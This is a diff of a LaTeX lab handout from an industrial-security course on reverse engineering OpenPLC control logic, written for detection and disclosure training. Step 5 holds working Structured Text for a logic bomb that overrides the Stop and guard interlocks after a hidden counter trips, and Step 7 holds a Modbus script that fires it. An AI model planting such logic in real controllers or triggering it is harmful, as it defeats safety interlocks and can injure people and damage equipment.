@@ -2,9 +2,9 @@
 
 \def\courseTitle{Industrial Security (Master)}
 \def\labNumber{02}
-\def\labTitle{Inject and Detect a Stuxnet-style Logic Bomb}
+\def\labTitle{PLC Control-Logic Reverse Engineering}
 \def\labSection{02}
-\def\labTime{2--3 hours}
+\def\labTime{3--4 hours}
 
 \input{../../../template/lab-preamble.tex}
 
@@ -12,44 +12,448 @@
 \labheader
 
 \begin{goalbox}
-Plant a small ``stealth'' modification on a soft-PLC you own. Detect it from an external monitoring point. End with a written disclosure-ready report.
+You will take a control program from \emph{compiled artefact} back to
+\emph{control intent}. Working on the soft-PLC you own (the Bachelor
+OpenPLC stack), you will: obtain the program in its three on-target
+representations (IEC~61131-3 source, the MatIEC-generated C, the linked
+runtime binary); identify the IEC~61131-3 language and the I/O map; lift
+the ladder/structured-text logic and reconstruct the I/O mapping,
+interlocks, and set-points; plant and then \emph{detect} a Stuxnet-style
+conditional logic bomb; reconcile the recovered logic against a process
+description; and (stretch) write a small parser that turns the on-target
+artefacts back into human-readable control intent. Every conclusion you
+draw must be backed by a byte you actually read, not by the engineering
+project file --- because the project file is exactly what an attacker
+leaves untouched.
 \end{goalbox}
 
-\begin{stepbox}{1 -- Baseline}
+\begin{notebox}
+This lab assumes the full Bachelor ICS-security background: you already
+know Modbus function codes, the scan cycle, the seal-in latch, and what a
+\texttt{\%IX}/\texttt{\%QX} address is. We skip the IT-analogue scaffolding
+and go straight to the artefacts.
+\end{notebox}
+
+% =============================================================
+\section*{Tooling and setup}
+
+All artefacts in this lab are produced by the OpenPLC runtime, which is a
+faithful, inspectable stand-in for a commercial soft-PLC: it compiles
+IEC~61131-3 source to C with the \texttt{iec2c} (MatIEC) front-end, then
+\emph{statically links the user logic into the runtime binary}. That last
+fact is the whole point of control-logic RE --- the artefact the controller
+executes is not the project the engineer sees.
+
+\begin{center}
+\footnotesize
+\begin{tabular}{@{}p{3.0cm}p{4.2cm}p{6.8cm}@{}}
+\toprule
+\textbf{Artefact} & \textbf{Path in \texttt{is-openplc}} & \textbf{What it is} \\
+\midrule
+\texttt{NNNNNN.st}      & \texttt{webserver/st\_files/}      & The uploaded IEC~61131-3 source (ST). \\
+\texttt{POUS.c}         & \texttt{webserver/core/}           & MatIEC C lifting of every POU body. \\
+\texttt{Res0.c}, \texttt{Config0.c} & \texttt{webserver/core/} & Resource/configuration glue + task wiring. \\
+\texttt{LOCATED\_VARIABLES.h} & \texttt{webserver/core/}     & The authoritative \texttt{\%I}/\texttt{\%Q} address map. \\
+\texttt{VARIABLES.csv}  & \texttt{webserver/core/}           & Symbol table + the task tick-time (ns). \\
+\texttt{openplc}        & \texttt{webserver/core/}           & The linked ELF the PLC actually runs. \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\begin{stepbox}{0 -- Bring the target up and fix a host shell}
+From the repository root, on the \emph{host}:
 \begin{lstlisting}[language=bash]
-docker compose up -d           # bachelor/labs/_stack
-# Upload conveyor.st via OpenPLC web UI (Lab 02 of bachelor course).
-# Capture baseline blocks:
+cd bachelor/labs/_stack
+docker compose up -d
+docker compose ps          # is-openplc must be "Up (healthy)"
+\end{lstlisting}
+The \texttt{openplc-init} sidecar uploads and compiles
+\texttt{conveyor.st} and starts the PLC. You now have a controller running
+a program whose source you can pretend you have \emph{not} seen --- treat
+\texttt{conveyor.st} as the ``vendor documentation'' you will later
+reconcile against, not as the answer key.
+
+\smallskip
+Open a shell on the OpenPLC container; this is where the on-target
+artefacts live:
+\begin{lstlisting}[language=bash]
+docker compose exec openplc bash
+cd /app/OpenPLC_v3/webserver
+\end{lstlisting}
+\end{stepbox}
+
+% =============================================================
+\section*{Part A -- Acquisition: three representations of one program}
+
+\begin{stepbox}{1 -- Pull the compiled program off the target}
+Acquire all three on-target representations and fingerprint them, so that
+every later claim is anchored to a hash you recorded:
+\begin{lstlisting}[language=bash]
+# 1. The IEC 61131-3 source the runtime was built from.
+ls -l st_files/                       # NNNNNN.st (random name) + blank_program.st
+# 2. The MatIEC C lifting of the logic.
+ls -l core/POUS.c core/Res0.c core/Config0.c
+ls -l core/LOCATED_VARIABLES.h core/VARIABLES.csv
+# 3. The linked runtime the PLC executes.
+file core/openplc
+sha256sum st_files/*.st core/POUS.c core/openplc
+\end{lstlisting}
+Expected (hashes are environment-specific; the \emph{shape} is the point):
+\begin{lstlisting}
+core/openplc: ELF 64-bit LSB shared object, x86-64, ... not stripped
+032f1928...  st_files/251844.st
+b82c5436...  core/POUS.c
+cbd04b16...  core/openplc
+\end{lstlisting}
+
+\noindent\textbf{What to look for.} You have just demonstrated the central
+asymmetry of control-logic RE: there are \emph{three} things that can
+disagree --- the ST source, the C lifting, and the linked binary. On a
+commercial PLC the equivalents are the project file (\texttt{.ap16},
+\texttt{.acd}, \texttt{.project}), the compiled blocks (MC7, \texttt{.L5K},
+bytecode), and the runtime image. An attacker who edits only the third
+leaves the first untouched, so the engineering station shows ``no
+changes''. Record all three hashes; they are your baseline.
+\end{stepbox}
+
+\begin{stepbox}{2 -- Identify the IEC 61131-3 representation}
+Decide \emph{which} of the five IEC~61131-3 languages you are looking at,
+because the lifting strategy differs (textual ST/IL vs.\ graphical
+LD/FBD/SFC). Inspect the source and the located-variable map:
+\begin{lstlisting}[language=bash]
+cat st_files/251844.st            # substitute your random filename
+cat core/LOCATED_VARIABLES.h
+cat core/VARIABLES.csv
+\end{lstlisting}
+\texttt{LOCATED\_VARIABLES.h} is the authoritative I/O map and looks like:
+\begin{lstlisting}
+__LOCATED_VAR(BOOL,__IX0_0,I,X,0,0)     (* Start  -> %IX0.0 *)
+__LOCATED_VAR(BOOL,__IX0_1,I,X,0,1)     (* Stop   -> %IX0.1 *)
+__LOCATED_VAR(BOOL,__IX0_2,I,X,0,2)     (* Guard1 -> %IX0.2 *)
+__LOCATED_VAR(BOOL,__IX0_3,I,X,0,3)     (* Guard2 -> %IX0.3 *)
+__LOCATED_VAR(BOOL,__QX0_0,Q,X,0,0)     (* Motor  -> %QX0.0 *)
+__LOCATED_VAR(BOOL,__QX0_1,Q,X,0,1)     (* Lamp   -> %QX0.1 *)
+\end{lstlisting}
+The tail of \texttt{VARIABLES.csv} carries the task period in nanoseconds:
+\begin{lstlisting}
+// Ticktime
+20000000
+\end{lstlisting}
+
+\noindent\textbf{What to look for.} The \texttt{(* ... *)} comment syntax,
+the \texttt{:=} assignment, and the \texttt{VAR ... AT \%IX0.0 : BOOL}
+declarations identify this as \textbf{Structured Text} (ST), not Ladder
+Diagram --- although the seal-in expression is logically a ladder rung and
+many tools will round-trip it to LD. Note that \texttt{20000000}~ns is the
+\texttt{T\#20ms} cyclic task; that period is the budget your later
+detection (and any logic bomb) must live inside.
+\end{stepbox}
+
+% =============================================================
+\section*{Part B -- Lifting: from compiled C back to control intent}
+
+\begin{stepbox}{3 -- Lift the logic from the MatIEC C body}
+Pretend the ST source was withheld and you only recovered \texttt{POUS.c}
+from the controller's filesystem. Read the body MatIEC emitted:
+\begin{lstlisting}[language=bash]
+cat core/POUS.c
+\end{lstlisting}
+The control law appears as:
+\begin{lstlisting}
+void MAIN_body__(MAIN *data__) {
+  __SET_LOCATED(data__->,MOTOR,,
+    ((((__GET_LOCATED(data__->START,) || __GET_LOCATED(data__->MOTOR,))
+       && __GET_LOCATED(data__->STOP,))
+       && __GET_LOCATED(data__->GUARD1,))
+       && __GET_LOCATED(data__->GUARD2,)));
+  __SET_LOCATED(data__->,LAMP,,__GET_LOCATED(data__->MOTOR,));
+}
+\end{lstlisting}
+Strip the \texttt{\_\_GET\_LOCATED}/\texttt{\_\_SET\_LOCATED} accessor noise
+and rewrite by hand into the equivalent ST/boolean form:
+\begin{lstlisting}
+Motor := (Start OR Motor) AND Stop AND Guard1 AND Guard2 ;
+Lamp  := Motor ;
+\end{lstlisting}
+
+\noindent\textbf{What to look for.} You have reconstructed the
+\emph{control intent} from the compiled artefact alone:
+\begin{itemize}\setlength{\itemsep}{1pt}
+  \item \textbf{I/O mapping} (from \texttt{LOCATED\_VARIABLES.h}):
+        \texttt{Start/Stop/Guard1/Guard2} are inputs \texttt{\%IX0.0--0.3};
+        \texttt{Motor/Lamp} are outputs \texttt{\%QX0.0--0.1}.
+  \item \textbf{Interlocks:} \texttt{Stop}, \texttt{Guard1}, \texttt{Guard2}
+        are \emph{ANDed} into every cycle --- any of them going false drops
+        the motor. From \texttt{POUS.c}'s init you can see
+        \texttt{Stop/Guard1/Guard2} default \texttt{TRUE}: these are
+        \emph{normally-closed} fail-safe inputs (cut wire = stop).
+  \item \textbf{Seal-in latch:} the \texttt{(Start OR Motor)} term is the
+        latch that keeps the motor running after the start button is
+        released.
+  \item \textbf{Set-points:} none in this program --- every term is boolean.
+        A real lift records ``no analogue set-points present'', which
+        becomes meaningful in Step~6.
+\end{itemize}
+\end{stepbox}
+
+\begin{stepbox}{4 -- Confirm the lift against the linked binary}
+The C is intermediate; the controller runs the ELF. Confirm the user logic
+really is linked in (so a future attacker editing only the binary is in
+scope) and that no \emph{second} program path exists:
+\begin{lstlisting}[language=bash]
+nm core/openplc | grep -Ei 'RES0_run|RES0_init|config_run'
+strings -n 5 core/openplc | grep -iE 'modbus|start_modbus' | head
+\end{lstlisting}
+Expected (addresses vary):
+\begin{lstlisting}
+000000000002ca29 T _Z10RES0_run__m       # the per-tick program runner
+000000000002c9fd T _Z11RES0_init__v
+\end{lstlisting}
+
+\noindent\textbf{What to look for.} \texttt{RES0\_run\_\_} is the symbol the
+cyclic task calls every tick; it dispatches into \texttt{MAIN\_body\_\_},
+which is the logic you just lifted. There should be exactly \emph{one}
+program runner. On a commercial controller the analogue is enumerating the
+OB/FC/FB or POU list and confirming there is no extra cyclic block
+(Stuxnet's hidden \texttt{OB35}) that the engineering project does not
+mention. ``One runner, and it matches the C I lifted'' is your clean
+baseline.
+\end{stepbox}
+
+% =============================================================
+\section*{Part C -- The Stuxnet pattern: plant, then detect}
+
+\begin{stepbox}{5 -- Plant a conditional logic bomb}
+On the \emph{host}, copy \texttt{conveyor.st} to a tampered variant that
+adds a hidden, counter-gated override on the otherwise-unused input
+\texttt{\%IX0.4}. This is the canonical logic-bomb shape: a branch that
+never fires under documented data and overrides the safety interlocks when
+it does.
+\begin{lstlisting}[language=bash]
+PROGRAM main
+  VAR
+    Start  AT %IX0.0 : BOOL;
+    Stop   AT %IX0.1 : BOOL := TRUE;
+    Guard1 AT %IX0.2 : BOOL := TRUE;
+    Guard2 AT %IX0.3 : BOOL := TRUE;
+    Trig   AT %IX0.4 : BOOL;          (* undocumented input *)
+    Motor  AT %QX0.0 : BOOL;
+    Lamp   AT %QX0.1 : BOOL;
+    n      : INT := 0;                (* hidden cycle counter *)
+  END_VAR
+  IF Trig THEN n := n + 1; END_IF;
+  IF n > 50 THEN
+    Motor := TRUE;                    (* override: ignores Stop + guards *)
+  ELSE
+    Motor := (Start OR Motor) AND Stop AND Guard1 AND Guard2;
+  END_IF;
+  Lamp := Motor;
+END_PROGRAM
+\end{lstlisting}
+Upload this tampered program through the OpenPLC web UI (\emph{Programs}
+$\to$ upload $\to$ compile $\to$ Start), \emph{without} touching the
+original \texttt{conveyor.st} on disk --- this models an attacker who
+changes the runtime but leaves the engineering project pristine.
+\end{stepbox}
+
+\begin{stepbox}{6 -- Detect the bomb three ways}
+Re-acquire the artefacts and find the modification by each of the three
+detection paths a real programme would use.
+\begin{lstlisting}[language=bash]
+docker compose exec openplc bash -c '
+  cd /app/OpenPLC_v3/webserver
+  sha256sum core/POUS.c core/openplc       # 1. integrity vs. baseline
+  cat core/POUS.c | grep -iE "n |IF|> 50|TRUE"   # 2. logic inspection
+  cat core/LOCATED_VARIABLES.h'            # 3. new I/O point appears
+\end{lstlisting}
+\textbf{What to look for, per path:}
+\begin{enumerate}\setlength{\itemsep}{1pt}
+  \item \textbf{Integrity.} Both \texttt{POUS.c} and the \texttt{openplc}
+        ELF hash differ from your Step-1 baseline. A continuous block-CRC
+        monitor (Claroty/Dragos/Nozomi) flags this within one poll, and
+        crucially \emph{the engineering project file's hash is unchanged} ---
+        proving the divergence is on the controller, not in the project.
+  \item \textbf{Logic.} \texttt{POUS.c} now contains a counter
+        (\texttt{n}), an \texttt{IF n > 50} branch, and an unconditional
+        \texttt{MOTOR := TRUE} that bypasses \texttt{Stop/Guard1/Guard2}.
+        That is a textbook logic bomb: time/counter trigger + interlock
+        override.
+  \item \textbf{I/O map.} \texttt{LOCATED\_VARIABLES.h} now declares
+        \texttt{\_\_IX0\_4} --- an input that is \emph{read but appears in no
+        documented rung}. An input that is read and never justified by the
+        process description is the highest-value tell.
+\end{enumerate}
+\end{stepbox}
+
+\begin{stepbox}{7 -- Observe the bomb fire from outside}
+Confirm the override is real by watching the coil from the network while
+you drive the trigger, without ever pressing Start/Stop on the HMI:
+\begin{lstlisting}[language=bash]
 docker compose exec student python3 - <<'PY'
-import hashlib, snap7
-c = snap7.client.Client(); c.connect("172.28.0.10", 0, 1)
-for t, n in [(snap7.types.Block.OB, 1)]:
-    b = c.upload(t, n); print(f"OB{n} sha256: {hashlib.sha256(b).hexdigest()}")
-c.disconnect()
+from pymodbus.client import ModbusTcpClient
+import time
+c = ModbusTcpClient("172.28.0.10", port=502); c.connect()
+# Pulse the undocumented input %IX0.4 (discrete-input force via coil map)
+for i in range(60):
+    c.write_coil(address=4, value=True, slave=1)   # drive Trig high
+    motor = c.read_coils(address=0, count=1, slave=1).bits[0]
+    if motor:
+        print(f"Motor latched HIGH at iteration {i} with no Start press")
+        break
+    time.sleep(0.05)
+c.close()
 PY
 \end{lstlisting}
+\textbf{What to look for.} \texttt{Motor} (coil~0) goes \texttt{True} after
+roughly 50 trigger cycles, with no operator action and with \texttt{Stop}
+in its safe (closed) state. Capture this in \texttt{tshark}
+(\texttt{docker compose exec student tshark -i eth0 -f "tcp port 502"}) and
+note the function codes: FC5/FC15 (write coil) driving the trigger, FC1
+(read coils) observing the unauthorised \texttt{Motor} assertion.
 \end{stepbox}
 
-\begin{stepbox}{2 -- Plant the modification}
-Edit the ladder so an unused input (\texttt{IX0.4}) gates a counter that, after N=50 cycles, drives \texttt{Motor} high regardless of the start/stop logic. Download \emph{only} the modified runtime, do not save the project. Re-take SHA-256.
+% =============================================================
+\section*{Part D -- Reconcile against the documented process}
+
+\begin{stepbox}{8 -- Diff recovered intent against the spec}
+Treat the original \texttt{conveyor.st} (Step~0) as the documented process
+description: ``a conveyor motor runs once Start is pressed, latches via
+seal-in, and stops on Stop or on either guard opening; a lamp mirrors the
+motor''. Build a reconciliation table from your \emph{recovered} logic:
+\begin{center}
+\footnotesize
+\begin{tabular}{@{}p{4.6cm}p{4.4cm}p{4.6cm}@{}}
+\toprule
+\textbf{Documented behaviour} & \textbf{Recovered (clean)} & \textbf{Recovered (tampered)} \\
+\midrule
+Motor latches on Start & matches (\texttt{Start OR Motor}) & matches in \texttt{ELSE} branch \\
+Stop/guards drop motor & matches (ANDed interlocks) & \textbf{bypassed when } \texttt{n>50} \\
+Inputs \texttt{\%IX0.0--0.3} & matches & \textbf{extra} \texttt{\%IX0.4} \\
+No undocumented set-points & confirmed (boolean only) & hidden counter \texttt{n} \\
+\bottomrule
+\end{tabular}
+\end{center}
+\textbf{What to look for.} The reconciliation makes the deviation
+explicit and reportable: a present-but-undocumented input, a
+counter-gated state, and an interlock override are each a separate finding.
+On a real plant this table is the bridge between the RE artefact and the
+process-safety engineer, who must decide whether the deviation is malicious
+or merely undocumented vendor behaviour.
 \end{stepbox}
 
-\begin{stepbox}{3 -- Watch from the outside}
+% =============================================================
+\section*{Troubleshooting}
+
+\begin{stepbox}{T -- When something refuses to work}
+\begin{itemize}\setlength{\itemsep}{2pt}
+  \item \textbf{\texttt{core/POUS.c} missing or stale.} It is regenerated
+        only at compile time. Re-upload and click \emph{Compile} in the web
+        UI, then re-list \texttt{core/}.
+  \item \textbf{Random \texttt{NNNNNN.st} name unknown.}
+        \texttt{ls -t st\_files/ | head -1} gives the most recently
+        uploaded program.
+  \item \textbf{\texttt{nm} prints nothing.} The shipped binary is
+        \emph{not} stripped; if your build is, lift from \texttt{POUS.c}
+        and \texttt{Res0.c} instead --- the C is the authoritative
+        intermediate.
+  \item \textbf{Driving \texttt{\%IX0.4} does nothing.} OpenPLC maps
+        discrete inputs to a coil-style force; if your runtime exposes
+        \texttt{\%IX0.4} as an input register instead, force it from the
+        web-UI \emph{Monitoring} page and re-run Step~7's read loop.
+  \item \textbf{Motor latched on from a previous run.} Stop the PLC, set
+        \texttt{n} back via re-upload of the clean program, and restart;
+        the counter is non-retentive on a fresh compile.
+\end{itemize}
+\end{stepbox}
+
+% =============================================================
+\section*{Stretch goal (optional)}
+
+\begin{stepbox}{S -- Write a control-intent extractor}
+Write a small parser (Python, $\sim$40 lines) that consumes the on-target
+artefacts and emits a control-intent summary without you reading the ST by
+hand --- the seed of a real integrity tool:
 \begin{lstlisting}[language=bash]
-docker compose exec student python3 /labs/scripts/modbus_poll_loop.py
+docker compose exec openplc python3 - <<'PY'
+import re, pathlib
+core = pathlib.Path("/app/OpenPLC_v3/webserver/core")
+# 1. I/O map from LOCATED_VARIABLES.h
+io = re.findall(r'__LOCATED_VAR\((\w+),__(\w)X(\d+)_(\d+),(\w),',
+                (core/"LOCATED_VARIABLES.h").read_text())
+for typ, ax, b, bit, dirn in io:
+    kind = "input" if dirn == "I" else "output"
+    print(f"  %{ax}X{b}.{bit:<3} {kind:<6} {typ}")
+# 2. Tick-time from VARIABLES.csv
+csv = (core/"VARIABLES.csv").read_text()
+ns = csv.strip().splitlines()[-1]
+print(f"  task period: {int(ns)/1e6:.0f} ms")
+# 3. Flag reads with no documented justification (heuristic):
+body = (core/"POUS.c").read_text()
+reads = set(re.findall(r'__GET_LOCATED\(data__->(\w+)', body))
+writes = set(re.findall(r'__SET_LOCATED\(data__->,(\w+)', body))
+print("  written-never-read (smoke):", writes - reads)
+print("  read-and-used:", reads)
+PY
 \end{lstlisting}
-Observe \texttt{Motor} firing without operator action. Capture in Wireshark; identify the function code(s).
+Extend it to: (a) flag any located input that is \emph{not} referenced in
+\texttt{POUS.c}, (b) diff two compiles' symbol sets to surface a newly
+added \texttt{\%IX0.4}, and (c) emit the recovered boolean expression by
+de-sugaring the \texttt{\_\_GET\_LOCATED} accessors. Compare your output to
+the known tools mentioned in \emph{Further reading} (l5k-parser for
+Rockwell, \texttt{plcrev}/MatIEC round-trips, the SCADA StrangeLove MC7
+parsers for Siemens).
 \end{stepbox}
 
-\begin{stepbox}{4 -- Detection}
-Re-compute the SHA-256 from the PLC after the modification. Compare to baseline. Document how a continuous-monitoring product (Claroty, Dragos, Nozomi) would surface this within seconds.
-\end{stepbox}
+% =============================================================
+\section*{Deliverable}
 
 \begin{deliverbox}
-A 1-page report containing: baseline hash, post-injection hash, PCAP of the unauthorised \texttt{Motor} firing, a sentence on the mitigation that would have prevented the download (e.g.\ key-switch in RUN), and the disclosure email you would send a vendor.
+A disclosure-ready PDF/markdown report containing:
+\begin{enumerate}\setlength{\itemsep}{1pt}
+  \item The Step-1 baseline hashes (ST, \texttt{POUS.c}, \texttt{openplc})
+        and the post-tamper hashes, side by side.
+  \item Your hand-lifted boolean control law recovered from \texttt{POUS.c}
+        in Step~3, with the I/O map and the named interlocks/seal-in.
+  \item The three independent detections from Step~6 (integrity, logic,
+        I/O map) and the \texttt{tshark} evidence + function codes from
+        Step~7 showing \texttt{Motor} firing with no operator action.
+  \item The reconciliation table from Step~8 with each deviation called out
+        as a separate finding.
+  \item One sentence on the control that would have prevented the
+        unauthorised download (key-switch in RUN; signed program download),
+        and a short, professional vendor-disclosure email (no real plant
+        tags or constants).
+  \item (Stretch) your extractor source and its output.
+\end{enumerate}
 \end{deliverbox}
 
+% =============================================================
+\section*{Further reading}
+
+\begin{itemize}\setlength{\itemsep}{1pt}
+  \item Langner, R. \emph{To Kill a Centrifuge}, The Langner Group, Nov 2013.
+  \item Falliere, N., Murchu, L., Chien, E. \emph{W32.Stuxnet Dossier}, v1.4, Symantec, 2011.
+  \item Beresford, D. \emph{Exploiting Siemens Simatic S7 PLCs}, BlackHat USA, 2011.
+  \item Gordeychik, S. et al. \emph{SCADA StrangeLove} MC7/Step7 parser tooling, 2014--2018.
+  \item Rockwell Automation. \emph{Logix5000 Controllers Import/Export}, manual 1756-RM084 (\texttt{.L5K}/\texttt{.L5X}).
+  \item CISA \emph{ICSA-23-103-09} et al.\ (CoDe16, CODESYS Runtime), 2023.
+  \item IEC 61131-3:2013. \emph{Programmable controllers -- Part 3: Programming languages.}
+  \item MatIEC / \texttt{iec2c}; OpenPLC Project runtime docs, \url{https://openplcproject.com/docs/}.
+  \item Lecture slides, Section 02 -- PLC Ladder Logic Reverse Engineering.
+\end{itemize}
+
+% =============================================================
 \begin{warnbox}
-Do this only on your lab PLC. Modifying production ladder logic without written authorisation is criminal in essentially every jurisdiction.
+Perform every step \emph{only} on the lab soft-PLC you own. Acquiring,
+lifting, or modifying control logic from a PLC you do not own is criminal
+in essentially every jurisdiction, and in many (US DMCA \S1201, German
+\S202c~StGB) even possessing the tooling against a third-party target is
+constrained --- consult counsel before any non-lab work. Logic recovered
+from a production controller you do not own is contaminated evidence that
+no serious vendor PSIRT will accept. Findings on control logic touch
+process \emph{safety}: coordinate with the safety engineer, not just IT,
+and never test a logic bomb against equipment wired to anything that can
+move, heat, or hold pressure.
 \end{warnbox}
+
 \end{document}
